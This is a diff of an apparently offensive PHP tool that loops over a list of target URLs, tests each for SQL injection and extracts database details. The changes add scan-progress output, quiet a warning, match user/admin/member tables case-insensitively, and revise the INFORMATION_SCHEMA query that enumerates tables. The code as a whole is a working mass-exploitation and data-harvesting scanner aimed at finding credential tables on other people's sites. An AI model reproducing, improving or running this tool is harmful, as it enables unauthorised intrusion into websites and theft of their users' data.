@@ -110,6 +110,8 @@ function startScan($inputFile, $potentialList, $logFile)
 
     $i = 0;
 
+    $listCount = count($potentialList);
+
     // iterate through potential targets...
     foreach ($potentialList as $url) {
         if (!$lastScanned || $url == $lastScanned) {
@@ -118,7 +120,7 @@ function startScan($inputFile, $potentialList, $logFile)
         } elseif ($ignoreFlag) {
             //continue;
         }
-        scanUrl($url, $logFile, $swapFile, $lastScanned);
+        scanUrl($url, $logFile, $swapFile, $lastScanned, $i, $listCount);
         $i++;
     }
 
@@ -135,15 +137,19 @@ function startScan($inputFile, $potentialList, $logFile)
  * Tests a single URL for SQL injection and data retrieval
  *
  * @access Public
- * @param String The nURL to test
+ * @param String The URL to test
  * @param String The name of the log file to record results to
+ * @param Integer The position in the list of URLs to be scanned
+ * @param Integer The length of the list of URLs
  * @return void
  */
-function scanUrl($candidate, $logFile, $swapFile)
+function scanUrl($candidate, $logFile, $swapFile, $siteNumber, $listCount)
 {
     $website = new stdClass;
 
-    echo "\n$candidate";
+    echo "\n\n".str_repeat('*', 60);
+
+    echo "\n\nScanning $siteNumber of $listCount :: $candidate";
 
     ftruncate($swapFile, 0);
 
@@ -207,7 +213,7 @@ function scanUrl($candidate, $logFile, $swapFile)
         )
     );
 
-    list($dbVersion, $dbName, $dbUser) = explode('|', $dbVersion);
+    @list($dbVersion, $dbName, $dbUser) = explode('|', $dbVersion);
 
     echo "\n\nDatabase Version: $dbVersion";
     echo "\n\nDatabase Name: $dbName";
@@ -225,7 +231,7 @@ function scanUrl($candidate, $logFile, $swapFile)
     print_r($website->tablesList);
 
     // do any table names contain 'user' keyword
-    $website->userTables = preg_grep("/(user|admin|member)/", $website->tablesList);
+    $website->userTables = preg_grep("/(user|admin|member)/i", $website->tablesList);
 
     // if so, get columns of these tables
     $website->userTablesColumns = getColumns(
@@ -352,13 +358,9 @@ function getTables($injectionPoint, $numberColumns, $reflectedColumns)
         $tables = array();
         $i = 2;
         $tableName = array(reset($tables));
-        while (!empty($tableName) && $i < 100) {
-            if (!isset($dbName) || !isset($website)) {
-                continue;
-            }
-            
-            $qualifier = ' FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 0x'.strToHex($dbName)
-                        .' AND table_name NOT IN ('.implode($website->tablesList).') LIMIT '.$i.', 1';
+        while (is_array($tablesList) && !empty($tableName) && $i < 100) {
+            $qualifier = ' FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = database()'
+                        .' AND table_name NOT IN ('.implode($tablesList).') LIMIT '.$i.', 1';
 
             $tableName = retrieveData($injectionPoint, 'table_name', $numberColumns, $reflectedColumns, $qualifier);
             if (!empty($tableName)) {
